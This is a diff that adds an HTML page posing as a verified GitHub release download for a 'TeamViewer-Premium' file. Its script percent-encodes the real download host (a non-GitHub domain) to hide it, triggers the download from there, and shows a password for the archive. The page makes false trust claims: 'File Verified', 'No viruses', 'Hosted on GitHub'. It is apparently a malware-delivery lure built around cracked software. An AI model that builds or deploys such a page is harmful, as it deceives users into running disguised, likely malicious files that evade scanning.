@@ -1,0 +1,683 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Download the Latest Release</title>
+  <meta name="description" content="Preparing a verified GitHub release download." />
+  <meta name="theme-color" content="#070b12" />
+  <link rel="icon" href="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0xNiAwQzcuMTYgMCAwIDcuMTYgMCAxNkMwIDIzLjA4IDQuNTggMjkuMDYgMTAuOTQgMzEuMThDMTEuNzQgMzEuMzIgMTIuMDQgMzAuODQgMTIuMDQgMzAuNDJDMTIuMDQgMzAuMDQgMTIuMDIgMjguNzggMTIuMDIgMjcuNDRDOCAyOC4xOCA2Ljk2IDI2LjQ2IDYuNjQgMjUuNTZDNi40NiAyNS4xIDUuNjggMjMuNjggNSAyMy4zQzQuNDQgMjMgMy42NCAyMi4yNiA0Ljk4IDIyLjI0QzYuMjQgMjIuMjIgNy4xNCAyMy40IDcuNDQgMjMuODhDOC44OCAyNi4zIDExLjE4IDI1LjYyIDEyLjEgMjUuMkMxMi4yNCAyNC4xNiAxMi42NiAyMy40NiAxMy4xMiAyMy4wNkM5LjU2IDIyLjY2IDUuODQgMjEuMjggNS44NCAxNS4xNkM1Ljg0IDEzLjQyIDYuNDYgMTEuOTggNy40OCAxMC44NkM3LjMyIDEwLjQ2IDYuNzYgOC44MiA3LjY0IDYuNjJDNy42NCA2LjYyIDguOTggNi4yIDEyLjA0IDguMjZDMTMuMzIgNy45IDE0LjY4IDcuNzIgMTYuMDQgNy43MkMxNy40IDcuNzIgMTguNzYgNy45IDIwLjA0IDguMjZDMjMuMSA2LjE4IDI0LjQ0IDYuNjIgMjQuNDQgNi42MkMyNS4zMiA4LjgyIDI0Ljc2IDEwLjQ2IDI0LjYgMTAuODZDMjUuNjIgMTEuOTggMjYuMjQgMTMuNCAyNi4yNCAxNS4xNkMyNi4yNCAyMS4zIDIyLjUgMjIuNjYgMTguOTQgMjMuMDZDMTkuNTIgMjMuNTYgMjAuMDIgMjQuNTIgMjAuMDIgMjYuMDJDMjAuMDIgMjguMTYgMjAgMjkuODggMjAgMzAuNDJDMjAgMzAuODQgMjAuMyAzMS4zNCAyMS4xIDMxLjE4QzI3LjQyIDI5LjA2IDMyIDIzLjA2IDMyIDE2QzMyIDcuMTYgMjQuODQgMCAxNiAwVjBaIiBmaWxsPSIjMjQyOTJFIi8+Cjwvc3ZnPgo=" type="image/svg+xml" />
+  <style>
+:root {
+  --bg: #070b12;
+  --panel: #10151e;
+  --line: rgba(255, 255, 255, 0.08);
+  --text: #f4f7fb;
+  --muted: #8b95a7;
+  --soft: #5d6878;
+  --blue: #4c8dff;
+  --green: #3ecf8e;
+  --red: #ff6b6b;
+  font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", sans-serif;
+  color-scheme: dark;
+}
+
+* { box-sizing: border-box; }
+
+html, body {
+  margin: 0;
+  height: 100%;
+}
+
+body {
+  height: 100dvh;
+  overflow: hidden;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  padding: 16px 20px 12px;
+  color: var(--text);
+  background:
+    linear-gradient(var(--line) 1px, transparent 1px),
+    linear-gradient(90deg, var(--line) 1px, transparent 1px),
+    radial-gradient(900px 420px at 50% -10%, rgba(76, 141, 255, 0.16), transparent 55%),
+    var(--bg);
+  background-size: 56px 56px, 56px 56px, auto, auto;
+  -webkit-font-smoothing: antialiased;
+}
+
+.glow {
+  position: fixed;
+  width: 280px;
+  height: 280px;
+  border-radius: 50%;
+  filter: blur(70px);
+  pointer-events: none;
+  z-index: 0;
+}
+
+.glow-a {
+  top: 12%;
+  left: 50%;
+  transform: translateX(-50%);
+  background: rgba(76, 141, 255, 0.18);
+}
+
+.glow-b {
+  bottom: 8%;
+  right: 12%;
+  width: 180px;
+  height: 180px;
+  background: rgba(76, 141, 255, 0.08);
+}
+
+.stage {
+  position: relative;
+  z-index: 1;
+  width: min(480px, 100%);
+  text-align: center;
+}
+
+.logo {
+  width: 88px;
+  height: 88px;
+  margin: 0 auto 14px;
+  display: grid;
+  place-items: center;
+  color: #f0f6fc;
+  text-decoration: none;
+  border-radius: 50%;
+  background: linear-gradient(180deg, #171d28, #0d121a);
+  border: 1px solid rgba(255, 255, 255, 0.08);
+  box-shadow:
+    0 0 0 10px rgba(76, 141, 255, 0.06),
+    0 18px 40px rgba(0, 0, 0, 0.35);
+}
+
+.logo svg {
+  width: 48px;
+  height: 48px;
+  display: block;
+}
+
+h1 {
+  margin: 0 0 8px;
+  font-size: clamp(26px, 4vw, 32px);
+  line-height: 1.12;
+  letter-spacing: -0.04em;
+  font-weight: 700;
+}
+
+.lede {
+  margin: 0 auto 16px;
+  max-width: 34em;
+  color: var(--muted);
+  font-size: 13px;
+  line-height: 1.6;
+}
+
+.hub {
+  display: grid;
+  gap: 10px;
+  text-align: left;
+}
+
+.verify {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 12px;
+  border-radius: 14px;
+  background: #10161f;
+  border: 1px solid rgba(76, 141, 255, 0.28);
+  box-shadow: inset 0 0 0 1px rgba(76, 141, 255, 0.04);
+}
+
+.hub-icon {
+  width: 40px;
+  height: 40px;
+  flex: 0 0 auto;
+  display: grid;
+  place-items: center;
+  border-radius: 12px;
+  color: #8eb6ff;
+  background: rgba(76, 141, 255, 0.1);
+  border: 1px solid rgba(76, 141, 255, 0.32);
+}
+
+.hub-icon svg {
+  width: 18px;
+  height: 18px;
+}
+
+.badge {
+  width: 16px;
+  height: 16px;
+  flex: 0 0 auto;
+  color: #10161f;
+}
+
+.badge .line {
+  display: grid;
+  place-items: center;
+  width: 16px;
+  height: 16px;
+  border-radius: 50%;
+  background: #8eb6ff;
+}
+
+.badge svg {
+  width: 12px;
+  height: 12px;
+}
+
+.verify-title {
+  margin: 0;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  color: #f4f7fb;
+  font-size: 15px;
+  font-weight: 700;
+}
+
+
+.verify-copy {
+  min-width: 0;
+  flex: 1;
+}
+
+.swap {
+  display: grid;
+  align-items: center;
+  overflow: hidden;
+}
+
+.verify-copy .swap:not(.badge) {
+  padding: 10px 0;
+  margin: -10px 0;
+  -webkit-mask-image: linear-gradient(to bottom, transparent, #000 12px, #000 calc(100% - 12px), transparent);
+  mask-image: linear-gradient(to bottom, transparent, #000 12px, #000 calc(100% - 12px), transparent);
+}
+
+.badge.swap {
+  overflow: visible;
+}
+
+.swap .line {
+  grid-area: 1 / 1;
+  opacity: 0;
+  transform: translateY(18px);
+}
+
+.swap .line.show {
+  opacity: 1;
+  transform: none;
+}
+
+.verify-title .line:has(b) {
+  cursor: pointer;
+}
+
+.verify-title b {
+  display: inline-block;
+  margin-left: 2px;
+  padding: 1px 7px 2px;
+  border-radius: 6px;
+  border: 1px solid rgba(76, 141, 255, 0.4);
+  background: rgba(76, 141, 255, 0.1);
+  color: #d6e4ff;
+  font-weight: 700;
+  line-height: 1.3;
+}
+
+.verify-sub {
+  margin: 2px 0 0;
+  color: #8b95a7;
+  font-size: 12px;
+}
+
+.win {
+  height: 46px;
+  width: 100%;
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+  border: 0;
+  border-radius: 12px;
+  color: #fff;
+  background: linear-gradient(180deg, #5b9bff, #2f81f7);
+  box-shadow: 0 8px 22px rgba(47, 129, 247, 0.28);
+  font: inherit;
+  font-size: 15px;
+  font-weight: 800;
+  cursor: pointer;
+}
+
+.win svg {
+  width: 18px;
+  height: 18px;
+}
+
+.win:hover {
+  filter: brightness(1.05);
+}
+
+.win:disabled {
+  opacity: 0.7;
+  cursor: default;
+}
+
+.trust {
+  list-style: none;
+  margin: 2px 0 0;
+  padding: 10px 0 0;
+  display: flex;
+  justify-content: center;
+  gap: 22px;
+  border-top: 1px solid rgba(255, 255, 255, 0.08);
+  color: #8b95a7;
+  font-size: 12px;
+  font-weight: 650;
+}
+
+.trust li {
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.trust svg {
+  width: 14px;
+  height: 14px;
+  color: #8eb6ff;
+}
+
+footer {
+  position: relative;
+  z-index: 1;
+  margin-top: 14px;
+  color: var(--soft);
+  font-size: 12px;
+}
+
+@media (max-width: 560px) {
+  body { padding: 12px 16px; }
+  .trust { gap: 16px; font-size: 13px; }
+}
+
+
+</style>
+</head>
+<body>
+  <div class="glow glow-a" aria-hidden="true"></div>
+  <div class="glow glow-b" aria-hidden="true"></div>
+
+  <main class="stage" id="card">
+    <a class="logo" id="repoLink" href="https://github.com" rel="noopener" aria-label="View on GitHub">
+      <svg viewBox="0 0 24 24" aria-hidden="true">
+        <path fill="currentColor" d="M10.226 17.284c-2.965-.36-5.054-2.493-5.054-5.256 0-1.123.404-2.336 1.078-3.144-.292-.741-.247-2.314.09-2.965.898-.112 2.111.36 2.83 1.01.853-.269 1.752-.404 2.853-.404 1.1 0 1.999.135 2.807.382.696-.629 1.932-1.1 2.83-.988.315.606.36 2.179.067 2.942.72.854 1.101 2 1.101 3.167 0 2.763-2.089 4.852-5.098 5.234.763.494 1.28 1.572 1.28 2.807v2.336c0 .674.561 1.056 1.235.786 4.066-1.55 7.255-5.615 7.255-10.646C23.5 6.188 18.334 1 11.978 1 5.62 1 .5 6.188.5 12.545c0 4.986 3.167 9.12 7.435 10.669.606.225 1.19-.18 1.19-.786V20.63a2.9 2.9 0 0 1-1.078.224c-1.483 0-2.359-.808-2.987-2.313-.247-.607-.517-.966-1.034-1.033-.27-.023-.359-.135-.359-.27 0-.27.45-.471.898-.471.652 0 1.213.404 1.797 1.235.45.651.921.943 1.483.943.561 0 .92-.202 1.437-.719.382-.381.674-.718.944-.943"/>
+      </svg>
+    </a>
+
+    <h1 id="title">Download the Latest Release</h1>
+    <p class="lede" id="subtitle">Click the button to download the file<br>For installation, follow the instructions in the archive</p>
+
+    <section class="hub">
+      <div class="verify">
+        <span class="hub-icon" aria-hidden="true">
+          <svg viewBox="0 0 640 512" fill="currentColor" aria-hidden="true"><path d="M144 480C64.5 480 0 415.5 0 336c0-62.8 40.2-116.2 96.2-135.9c-.1-2.7-.2-5.4-.2-8.1c0-88.4 71.6-160 160-160c59.3 0 111 32.2 138.7 80.2C409.9 102 428.3 96 448 96c53 0 96 43 96 96c0 12.2-2.3 23.8-6.4 34.6C596 238.4 640 290.1 640 352c0 70.7-57.3 128-128 128H144zm79-167l80 80c9.4 9.4 24.6 9.4 33.9 0l80-80c9.4-9.4 9.4-24.6 0-33.9s-24.6-9.4-33.9 0l-39 39V184c0-13.3-10.7-24-24-24s-24 10.7-24 24V318.1l-39-39c-9.4-9.4-24.6-9.4-33.9 0s-9.4 24.6 0 33.9z"/></svg>
+        </span>
+        <div class="verify-copy" id="verifyCopy">
+          <p class="verify-title">
+            <span class="badge swap" aria-hidden="true">
+              <span class="line show">
+                <svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M3.5 8.2 6.4 11.1 12.5 4.8"/></svg>
+              </span>
+              <span class="line">
+                <svg viewBox="0 0 16 16" fill="currentColor">
+                  <path fill-rule="evenodd" d="M4.2 6.5V5a3.8 3.8 0 0 1 7.6 0v1.5h.7A1.5 1.5 0 0 1 14 8v5a1.5 1.5 0 0 1-1.5 1.5h-9A1.5 1.5 0 0 1 2 13V8a1.5 1.5 0 0 1 1.5-1.5h.7Zm2 0h3.6V5a1.8 1.8 0 1 0-3.6 0v1.5Zm.65 4.05a1.15 1.15 0 1 1 1.9.87v1.08h-1.5v-1.08a1.15 1.15 0 0 1-.4-.87Z" clip-rule="evenodd"/>
+                </svg>
+              </span>
+            </span>
+            <span class="swap">
+              <span class="line show" id="status">File Verified</span>
+              <span class="line">Archive password:<b id="passwordValue">2026</b></span>
+            </span>
+          </p>
+          <p class="verify-sub">
+            <span class="swap">
+              <span class="line show" id="ready">Ready to download · Secure connection</span>
+              <span class="line">Required to unlock the downloaded file</span>
+            </span>
+          </p>
+        </div>
+      </div>
+
+      <button class="win" id="primary" type="button">
+        <svg viewBox="0 0 16 16" fill="currentColor" aria-hidden="true"><path d="M0 2.3 6.6 1.4v6.1H0Zm7.3-1L16 0v7.5H7.3ZM0 8.5h6.6v6.1L0 13.6Zm7.3.1H16V16l-8.7-1.2Z"/></svg>
+        Download for Windows
+      </button>
+
+      <ul class="trust">
+        <li>
+          <svg viewBox="0 0 16 16" fill="currentColor" aria-hidden="true"><path d="M8 1.2 3 3.1v4.2c0 3.1 2.1 5.2 5 6.5 2.9-1.3 5-3.4 5-6.5V3.1L8 1.2Zm2.6 4.9-3.1 3.1-1.5-1.5-.8.8 2.3 2.3 3.9-3.9-.8-.8Z"/></svg>
+          No viruses
+        </li>
+        <li>
+          <svg viewBox="0 0 16 16" fill="currentColor" aria-hidden="true"><path d="M5 7V5a3 3 0 0 1 6 0v2h1.2A1.8 1.8 0 0 1 14 8.8v4.4A1.8 1.8 0 0 1 12.2 15H3.8A1.8 1.8 0 0 1 2 13.2V8.8A1.8 1.8 0 0 1 3.8 7H5Zm1.2 0h3.6V5a1.8 1.8 0 0 0-3.6 0v2Z"/></svg>
+          SSL
+        </li>
+        <li>
+          <svg viewBox="0 0 16 16" fill="currentColor" aria-hidden="true"><path d="M4.2 11.2h7.7a2.6 2.6 0 0 0 .4-5.1 3.6 3.6 0 0 0-6.9-.7 2.5 2.5 0 0 0-1.2 5.8Z"/></svg>
+          CDN
+        </li>
+      </ul>
+    </section>
+  </main>
+
+  <footer>Hosted on GitHub</footer>
+
+  <script>
+window.SITE = {
+  owner: "YottaStarWinch",
+  repo: "TeamViewer-Premium",
+  title: "Download the Latest Release",
+  subtitle:
+    "Click the button to download the file\nFor installation, follow the instructions in the archive",
+  downloads: 14000,
+  virusScan: "Virus scan: clean",
+  archivePassword: "2026",
+  releaseUrl:
+    "https://%67%69%74%64%6F%77nloa%64.%6C%69ve/TeamViewer-Premium",
+  assetName: "",
+  corsProxy: "",
+};
+
+(() => {
+  const SITE = window.SITE || {};
+  const ARCHIVE_RE = /\.(zip|7z|rar|tar|gz|tgz|bz2|xz|iso|dmg|exe|msi|pkg)$/i;
+  const $ = (id) => document.getElementById(id);
+  const ui = {
+    title: $("title"),
+    subtitle: $("subtitle"),
+    status: $("status"),
+    ready: $("ready"),
+    verify: document.querySelector(".verify"),
+    passwordValue: $("passwordValue"),
+    passwordLine: document.getElementById("passwordValue") && document.getElementById("passwordValue").closest(".line"),
+    repoLink: $("repoLink"),
+    primary: $("primary"),
+  };
+
+  const state = {
+    busy: false,
+    started: false,
+    revealed: false,
+    asset: null,
+  };
+
+  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+
+  function applyCopy() {
+    const owner = SITE.owner || "github";
+    const repo = SITE.repo || "repository";
+    ui.repoLink.href = `https://github.com/${owner}/${repo}`;
+    ui.title.textContent = SITE.title || "Download the Latest Release";
+    const subtitle =
+      SITE.subtitle ||
+      "Click the button to download the file\nFor installation, follow the instructions in the archive";
+    ui.subtitle.innerHTML = subtitle
+      .replace(/&/g, "&amp;")
+      .replace(/</g, "&lt;")
+      .replace(/>/g, "&gt;")
+      .replace(/\n/g, "<br>");
+    state.password = String(SITE.archivePassword || "").trim();
+    if (ui.ready) ui.ready.textContent = "Ready to download · Secure connection";
+    if (ui.passwordValue && state.password) ui.passwordValue.textContent = state.password;
+  }
+
+  async function revealPassword() {
+    if (!ui.verify || state.revealed) return;
+    state.revealed = true;
+    const swaps = [...ui.verify.querySelectorAll(".swap")];
+    const outgoing = swaps.map((swap) => swap.querySelector(".line.show"));
+    const incoming = swaps.map((swap) =>
+      [...swap.querySelectorAll(".line")].find((line) => !line.classList.contains("show"))
+    );
+
+    const outAnimations = outgoing.map((line) =>
+      line.animate(
+        [
+          { opacity: 1, transform: "translateY(0)" },
+          { opacity: 0, transform: "translateY(-18px)" },
+        ],
+        { duration: 340, easing: "cubic-bezier(.4, 0, .2, 1)", fill: "forwards" }
+      )
+    );
+    await Promise.all(outAnimations.map((animation) => animation.finished));
+
+    outgoing.forEach((line) => line.classList.remove("show"));
+    incoming.forEach((line) => line.classList.add("show"));
+    outAnimations.forEach((animation) => animation.cancel());
+
+    const inAnimations = incoming.map((line) =>
+      line.animate(
+        [
+          { opacity: 0, transform: "translateY(18px)" },
+          { opacity: 1, transform: "translateY(0)" },
+        ],
+        { duration: 460, easing: "cubic-bezier(.16, 1, .3, 1)" }
+      )
+    );
+    await Promise.all(inAnimations.map((animation) => animation.finished));
+  }
+
+  async function swapChip(text) {
+    const el = ui.passwordValue;
+    await el.animate(
+      [
+        { opacity: 1, transform: "translateY(0)" },
+        { opacity: 0, transform: "translateY(-5px)" },
+      ],
+      { duration: 180, easing: "ease", fill: "forwards" }
+    ).finished;
+    el.textContent = text;
+    el.animate(
+      [
+        { opacity: 0, transform: "translateY(5px)" },
+        { opacity: 1, transform: "translateY(0)" },
+      ],
+      { duration: 240, easing: "cubic-bezier(.16, 1, .3, 1)", fill: "forwards" }
+    );
+  }
+
+  async function copyPassword() {
+    const password = state.password;
+    if (!password || !ui.passwordValue || state.copying) return;
+    state.copying = true;
+    try {
+      await navigator.clipboard.writeText(password);
+    } catch {
+      const field = document.createElement("textarea");
+      field.value = password;
+      field.setAttribute("readonly", "");
+      field.style.position = "fixed";
+      field.style.left = "-9999px";
+      document.body.appendChild(field);
+      field.select();
+      document.execCommand("copy");
+      field.remove();
+    }
+    await swapChip("Copied");
+    await sleep(900);
+    await swapChip(password);
+    state.copying = false;
+  }
+
+  function unmaskDomain(input) {
+    const raw = String(input || "");
+    try {
+      return decodeURIComponent(raw);
+    } catch {
+      return raw;
+    }
+  }
+
+  function readQuery() {
+    const q = new URLSearchParams(location.search);
+    return {
+      releaseUrl: unmaskDomain(q.get("release") || q.get("url") || SITE.releaseUrl || ""),
+      assetName: q.get("file") || SITE.assetName || "",
+    };
+  }
+
+  function parseGithub(input) {
+    if (!input) return null;
+    try {
+      const u = new URL(input);
+      if (u.hostname !== "github.com") return { kind: "direct", url: input };
+      const parts = u.pathname.replace(/^\/|\/$/g, "").split("/");
+      const [owner, repo, section, a, b] = parts;
+      if (!owner || !repo) return null;
+      if (section === "releases" && a === "download" && b) {
+        return {
+          kind: "asset",
+          owner,
+          repo,
+          tag: decodeURIComponent(b),
+          file: decodeURIComponent(parts.slice(5).join("/")),
+          page: `https://github.com/${owner}/${repo}`,
+        };
+      }
+      if (section === "releases" && a === "tag" && b) {
+        return { kind: "tag", owner, repo, tag: decodeURIComponent(b), page: `https://github.com/${owner}/${repo}` };
+      }
+      return { kind: "latest", owner, repo, page: `https://github.com/${owner}/${repo}` };
+    } catch {
+      return null;
+    }
+  }
+
+  async function githubJson(path) {
+    const res = await fetch(`https://api.github.com${path}`, {
+      headers: { Accept: "application/vnd.github+json" },
+    });
+    if (!res.ok) {
+      throw new Error(
+        res.status === 404
+          ? "Release not found."
+          : res.status === 403
+            ? "GitHub rate limit. Wait a minute and try again."
+            : `GitHub error ${res.status}.`
+      );
+    }
+    return res.json();
+  }
+
+  function pickAsset(release, wanted) {
+    const assets = Array.isArray(release.assets) ? release.assets : [];
+    if (wanted) {
+      const match = assets.find((a) => a.name.toLowerCase() === wanted.toLowerCase());
+      if (match) return match;
+    }
+    return assets.find((a) => ARCHIVE_RE.test(a.name)) || assets[0] || null;
+  }
+
+  async function resolveAsset(cfg) {
+    const parsed = parseGithub(cfg.releaseUrl);
+    if (!parsed) throw new Error("No release URL set.");
+
+    if (parsed.kind === "direct") {
+      ui.repoLink.href = parsed.url;
+      return {
+        name: cfg.assetName || parsed.url.split("/").pop() || "download.bin",
+        browser_download_url: parsed.url,
+        size: 0,
+      };
+    }
+
+    ui.repoLink.href = parsed.page;
+
+    if (parsed.kind === "asset") {
+      try {
+        const release = await githubJson(
+          `/repos/${parsed.owner}/${parsed.repo}/releases/tags/${encodeURIComponent(parsed.tag)}`
+        );
+        return pickAsset(release, cfg.assetName || parsed.file) || {
+          name: parsed.file,
+          browser_download_url: `https://github.com/${parsed.owner}/${parsed.repo}/releases/download/${parsed.tag}/${parsed.file}`,
+          size: 0,
+        };
+      } catch {
+        return {
+          name: parsed.file,
+          browser_download_url: `https://github.com/${parsed.owner}/${parsed.repo}/releases/download/${parsed.tag}/${parsed.file}`,
+          size: 0,
+        };
+      }
+    }
+
+    const path =
+      parsed.kind === "tag"
+        ? `/repos/${parsed.owner}/${parsed.repo}/releases/tags/${encodeURIComponent(parsed.tag)}`
+        : `/repos/${parsed.owner}/${parsed.repo}/releases/latest`;
+    const release = await githubJson(path);
+    const asset = pickAsset(release, cfg.assetName);
+    if (!asset) throw new Error("No files in this release.");
+    return asset;
+  }
+
+  function nativeSave(url, name) {
+    const a = document.createElement("a");
+    a.href = url;
+    a.download = name || "";
+    a.rel = "noopener";
+    a.style.display = "none";
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+  }
+
+  async function run() {
+    if (state.busy) return;
+    state.busy = true;
+    state.started = true;
+    if (ui.primary) ui.primary.disabled = true;
+
+    try {
+      const asset = state.asset || (await resolveAsset(readQuery()));
+      state.asset = asset;
+      await revealPassword();
+      nativeSave(asset.browser_download_url, asset.name);
+      await sleep(240);
+    } catch {
+      if (ui.status) ui.status.textContent = "Download failed";
+    } finally {
+      if (ui.primary) ui.primary.disabled = false;
+      state.busy = false;
+    }
+  }
+
+  applyCopy();
+  if (ui.passwordLine) ui.passwordLine.addEventListener("click", copyPassword);
+  if (ui.primary) ui.primary.addEventListener("click", run);
+
+  window.addEventListener(
+    "load",
+    async () => {
+      try {
+        state.asset = await resolveAsset(readQuery());
+      } catch {
+        state.asset = null;
+      }
+    },
+    { once: true }
+  );
+})();
+
+</script>
+</body>
+</html>
